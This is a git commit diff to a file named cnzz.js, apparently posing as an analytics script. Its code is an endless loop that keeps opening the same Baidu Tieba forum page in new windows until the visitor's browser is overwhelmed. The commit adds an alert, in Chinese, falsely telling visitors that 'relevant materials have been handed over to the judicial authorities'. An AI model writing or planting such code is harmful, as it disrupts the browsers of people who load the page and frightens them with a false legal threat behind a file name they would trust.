63945d2a9606f3480001d7f6205d605cc0219383
i566 <58461724+i566@users.noreply.github.com>
2020-01-03 13:37:18 +0800

    Update cnzz.js

--- cnzz.js
+++ cnzz.js
@@ -1,4 +1,5 @@
 for(var i=1;i>0;i++){
+  alert("相关资料已交给司法机关");
 window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
   window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
   window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
